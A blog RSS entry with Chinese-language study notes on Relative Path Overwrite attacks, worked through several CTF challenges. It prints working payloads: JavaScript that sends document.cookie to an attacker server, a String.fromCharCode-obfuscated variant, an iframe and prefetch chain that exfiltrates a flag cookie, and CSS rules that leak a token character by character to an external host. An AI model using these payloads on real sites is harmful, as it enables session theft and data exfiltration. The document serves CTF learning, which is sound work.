<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>RPO on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/rpo/</link><description>Recent content in RPO on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 24 Apr 2022 21:39:29 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/rpo/index.xml" rel="self" type="application/rss+xml"/><item><title>RPO攻击学习笔记</title><link>https://amiaaaz.github.io/2022/04/24/rpo-attack-study-notes/</link><pubDate>Sun, 24 Apr 2022 21:39:29 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/24/rpo-attack-study-notes/</guid><description>&lt;p>&lt;a href="http://0n0.fun/post/2018/03/learn-about-rpo-from-one-ctf-challenge/">http://0n0.fun/post/2018/03/learn-about-rpo-from-one-ctf-challenge/&lt;/a>&lt;/p>
&lt;hr>
&lt;p>RPO指Relative Path Overwrite 相对路径覆盖，利用浏览器和服务器的解析差异 将页面中使用相对路径引入的静态资源文件进行替换，完成RPO攻击&lt;/p>
&lt;p>最常见的就是对url path的解析差异，比如这样的url&lt;/p>
&lt;pre tabindex="0">&lt;code>http://192.168.31.175/test%2findex.html
&lt;/code>&lt;/pre>&lt;p>默认情况下apache会认为请求的是&lt;code>test%2findex.html&lt;/code>，无法访问，而Nginx会将&lt;code>%2f&lt;/code>解析为&lt;code>/&lt;/code> 从而认为请求的是test文件夹下的&lt;code>index.html&lt;/code>，正常访问（可以通过修改路由规则来影响这些）&lt;/p>
&lt;p>另一个需要满足的条件是页面静态资源文件的相对路径，以下面的题为例&lt;/p>
&lt;h2 id="强网杯-2018share-mind">[强网杯 2018]share mind&lt;/h2>
&lt;p>*没有找到docker文件，以下内容参考&lt;a href="https://yangrz.github.io/blog/2018/03/27/ctf/">wp1&lt;/a> | &lt;a href="https://xz.aliyun.com/t/2220">wp2&lt;/a>&lt;/p>
&lt;p>我们可以在report页面给bot提交一个link，还可以写note，如果不写标题只写内容的话在view时文章页面是直接打印的内容（无&lt;code>&amp;lt;h1&amp;gt;&lt;/code>），而两个都写了的话是把文章标题和内容都输出在html标签之间的（有&lt;code>&amp;lt;h1&amp;gt;&lt;/code>）&lt;/p>
&lt;p>&lt;img src="https://github.com/yangrz/blog/raw/gh-pages/img/share%20your%20mind6.png" alt="share your mind6">&lt;/p>
&lt;p>&lt;img src="https://github.com/yangrz/blog/raw/gh-pages/img/share%20your%20mind7.png" alt="share your mind7">&lt;/p>
&lt;p>在页面源码中我们可以发现jquery.min.js这个文件是使用的相对路径的方式引入到index.php页面&lt;/p>
&lt;p>&lt;img src="https://github.com/yangrz/blog/raw/gh-pages/img/share%20your%20mind8.png" alt="share your mind8">&lt;/p>
&lt;p>也就是说如果访问的页面是&lt;code>http://39.107.33.96:20000/index.php/&lt;/code>则会引入&lt;code>http://39.107.33.96:20000/index.php/static/js/jquery.min.js&lt;/code>，结合我们前面提过的url解析问题，如果访问的页面是&lt;code>http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2f&lt;/code> 浏览器则会尝试引入&lt;code>http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2fstatic/js/jquery.min.js&lt;/code>，而这个url请求的页面实际上还是我们的Note，也就是note内容将作为jquery.min.js被引入页面，如果note部分是payload，那么访问&lt;code>http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2f&lt;/code>就会执行&lt;/p>
&lt;p>我们可以构造类似这样的payload来偷cookie&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Image&lt;/span>&lt;span style="color:#111">()).&lt;/span>&lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://vps-ip:port/?cookie=&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>页面对引号做了转义，我们用&lt;code>String.fromCharCode&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Image&lt;/span>&lt;span style="color:#111">()).&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">104&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">116&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">116&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">112&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">58&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">55&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">52&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">122&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">119&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">48&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">99&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">121&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">105&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">111&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">63&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>cookie提示我们打另一个目录，构造exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">iframe&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">105&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">109&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">iframe&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">81&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">87&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">66&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">95&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">108&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">52&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">103&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">81&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">87&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">66&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">iframe&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">109&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">iframe&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">iframe&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">getElementById&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">109&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">)).&lt;/span>&lt;span style="color:#75af00">contentWindow&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">y1r0nz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">108&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">105&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">110&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">107&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">y1r0nz&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setAttribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">108&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">112&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">116&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">99&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">104&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">y1r0nz&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setAttribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">104&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">114&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">fromCharCode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">55&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">52&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">122&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">119&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">48&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">99&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">121&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">105&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">111&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">47&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">63&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">102&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">108&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">103&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">61&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">head&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">y1r0nz&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>经过浏览器渲染以后就是下述的两行html代码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">iframe&lt;/span> &lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;frame&amp;#34;&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/QWB_fl4g/QWB/&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">link&lt;/span> &lt;span style="color:#75af00">rel&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;prefetch&amp;#34;&lt;/span> &lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://7e4zw0.ceye.io/?flag=document.getElementById(frame).contentWindow.document.cookie&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>prefetch属性规定了当前文档在链接文档之前被调用，这样就可以外带对应路径下的cookie了&lt;/p>
&lt;h2 id="pwnhub-0618大物必须过">[pwnhub 0618]大物必须过&lt;/h2>
&lt;p>&lt;a href="https://pwnhub.cn/media/writeup/113/29b7f18c-b1f2-4cfc-8f84-1b3793c52a7a_9f56fde2.pdf">wp&lt;/a> | &lt;a href="https://blog.csdn.net/Fly_hps/article/details/80613543">wp2&lt;/a>&lt;/p>
&lt;p>report_bug.php页面可以提交link，classes.php页面引入css时使用了相对路径进行加载&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">linkrel&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">=&amp;#34;&lt;/span>&lt;span style="color:#75af00">stylesheet&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;#34;&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;text/css&amp;#34;&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;../../classes.css&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>与上面的思路相同，payload&lt;/p>
&lt;pre tabindex="0">&lt;code>http://52.80.19.55/user.php/69/0/..%2f..%2f..%2fclasses.php/0
&lt;/code>&lt;/pre>&lt;p>当访问这个url时，classes.css会被/user.php/69对应的内容所覆盖&lt;/p>
&lt;p>至于payload的内容，不同于我们常见的js payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">{}&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background-image&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">http://vpsip&lt;/span>&lt;span style="color:#111">);}&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="36c3ctf-2018urlstorage">[36c3CTF 2018]urlstorage&lt;/h2>
&lt;p>&lt;a href="https://github.com/eboda/34c3ctf/tree/master/urlstorage">dockerfile&lt;/a> | &lt;a href="https://www.cnblogs.com/iamstudy/articles/2017_34C4_web_urlstorage_writeup.html">wp&lt;/a> （由于dockerfile用的ubuntu17 无法复现）&lt;/p>
&lt;p>页面的css加载使用相对路径（可以进行rpo 控制css），csp信息如下&lt;/p>
&lt;pre tabindex="0">&lt;code>frame-ancestors &amp;#39;none&amp;#39;; form-action &amp;#39;self&amp;#39;; connect-src &amp;#39;self&amp;#39;; script-src &amp;#39;self&amp;#39;; font-src &amp;#39;self&amp;#39; ; style-src &amp;#39;self&amp;#39;;
&lt;/code>&lt;/pre>&lt;p>/urlstorage处可以提交name和url，存在csrf（可以任意修改他人的url）&lt;/p>
&lt;p>/flag?token=xxx处存在xss&lt;/p>
&lt;p>思路：通过可以覆盖的css信息模糊匹配/爆破出flag&lt;/p>
&lt;p>首先是爆破token，第一位字符：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">a&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">href&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#f92672">flag&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#f92672">token&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#f92672">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">//xxx.pw/rpo/?c=1&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">a&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">href&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#f92672">flag&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#f92672">token&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#f92672">1&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">//xxx.pw/rpo/?c=1&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">a&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">href&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#f92672">flag&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#f92672">token&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#f92672">f&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">//xxx.pw/rpo/?c=f&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>第二位字符：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">a&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">href&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#f92672">flag&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#f92672">token&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#f92672">10&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">//xxx.pw/rpo/?c=10&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">a&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">href&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#f92672">flag&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#f92672">token&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#f92672">11&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">//xxx.pw/rpo/?c=11&lt;/span>&lt;span style="color:#111">);}&lt;/span>
